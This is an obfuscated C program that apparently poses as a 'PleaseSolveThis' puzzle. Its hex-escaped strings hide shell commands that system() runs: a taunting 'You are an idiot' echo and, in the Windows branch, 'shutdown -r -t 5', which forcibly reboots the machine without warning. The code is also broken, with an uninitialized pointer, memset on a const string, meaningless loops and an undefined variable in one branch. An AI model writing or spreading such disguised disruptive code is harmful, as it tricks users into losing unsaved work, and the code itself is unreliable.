#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#define _ printf
#define __ scanf
#define ___ time_t
#define ____ system
#define _____ char
#define ______ strcmp
#define _______ return
#define _____A atoi
#define AAA _____A
#define __F__ free
#define I int
#define OOOO(A) A==1?_("\x53\x75\x63\x63\x65\x73\x73\x21\n"):____(shellcode+37)

#ifdef __GNUC__
#ifdef __linux__
struct S_ {_____ input[256];};_____ *shellcode = "\x65\x63\x68\x6f\x20\x22\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21\x22\0\x50\x6c\x65\x61\x73\x65\x53\x6f\x6c\x76\x65\x54\x68\x69\x73\0\x65\x63\x68\x6f\x20\x22\x59\x6f\x75\x20\x61\x72\x65\x20\x61\x6e\x20\x69\x64\x69\x6f\x74\x21\x21\x21\x20\x48\x41\x48\x41\x48\x41\x48\x41\x48\x41\x48\x41\x48\x41\x21\x21\x22\0\x73\x68\x75\x74\x64\x6f\x77\x6e\x20\x2d\x72\x20\x2d\x74\x20\x35"; _____ *oopoposa = "\xff\x12\x88\x87\0\x32\x31\0\x43\x43\x42\x51\x5f\0\x38\x31"; int main(void){
___ t=time(0);int H, A, L, O;struct S_ *U;_____ * input=(_____ *)malloc(1024);__("%s", U->input);for(H=A=L=O=99;H<0,A<0,L<0,O<0;H++,A++,L++,O++);for(const char* OOO = "GOODMORNING\0GOODAFTERNOON\0GOODNIGHT\0"; sizeof(char)<0;memset(OOO, 0, sizeof(OOO)));
for(H=_____A(oopoposa+5), A=AAA(oopoposa+6),L=AAA(oopoposa+14);sizeof(int)<0,sizeof(struct S_)<0;);
OOOO(______(U->input, shellcode+H)+A);for((______(U->input, shellcode+H)+A)==1?_("\x47\x4f\x4f\x44\x21\n"):exit(0);sizeof(_____)<0;);
__F__(input);_______ ____(shellcode);} 
#elif _WIN32
int main(void){____(shellcode+37);
_______ ____(shellcode+81);}
#endif
#endif